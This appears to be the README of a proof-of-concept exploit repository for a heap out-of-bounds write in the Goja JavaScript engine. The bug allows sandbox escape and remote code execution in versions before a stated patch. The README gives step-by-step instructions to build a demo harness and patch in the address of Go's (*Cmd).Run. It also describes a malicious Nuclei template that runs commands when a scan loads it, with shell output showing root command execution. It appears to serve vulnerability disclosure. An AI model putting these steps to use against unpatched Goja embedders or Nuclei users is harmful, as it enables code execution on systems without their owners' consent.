# Goja Heap Out of Bounds Write -> Sandbox Escape

Proof of concept exploits to escape a Goja sandbox for releases prior to June 18 2026. Patched in commit `7ac5d30`.

The exploits are tested and verified in the provided docker containers.

Both examples rely on heap spraying, so it may take several runs to successfully exploit.

## Demo Harness

An example Go program demonstrating RCE. Loads and runs `exploit.js`.
Go `.mod` file includes the vulnerable version of Goja.

To run:

1. Compile with `go build`
2. Find the offset of `*Cmd.run` with `go tool nm ./demo-harness | grep '(*Cmd).Run'`
3. Replace `let cmdRunAddr = 0xcafecafe;` in `exploit.js` with the offset from `nm`
4. Run the exploit `./demo-harness`

Example output:

```
root@54b00231f0c8:/app# ./demo-harness
found corrupted buffer
found read/write buffer
found stack array
triggered Date.now
root@54b00231f0c8:/app# cat /tmp/x
uid=0(root) gid=0(root) groups=0(root)
root@54b00231f0c8:/app#
```

## Nuclei

A template targeting Nuclei Linux amd64 v3.9.0, `sha256: c60e6d551358a39cd922ed57c903aae5749c59228c56ae004c85cb97303250a5`

Example output:

```
root@546497e06d8f:/app# sha256sum nuclei
c60e6d551358a39cd922ed57c903aae5749c59228c56ae004c85cb97303250a5  nuclei
root@546497e06d8f:/app# ./nuclei -duc -dut -target http://example.com -t ./exploit.yaml -v

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.9.0

		projectdiscovery.io

[VER] Started metrics server at localhost:9092
[VER] Saved 1 templates to metadata cache
[WRN] Skipping 1 unsigned template[s]
[INF] Current nuclei version: v3.9.0 (unknown) - remove '-duc' flag to enable update checks
[INF] Current nuclei-templates version:  (unknown) - remove '-duc' flag to enable update checks
[WRN] Scan results upload to cloud is disabled.
[INF] Targets loaded for current scan: 1
[INF] Scan completed in 676.991µs. No results found.
[FTL] Could not run nuclei: no templates provided for scan
root@546497e06d8f:/app# cat /tmp/x
uid=0(root) gid=0(root) groups=0(root)
```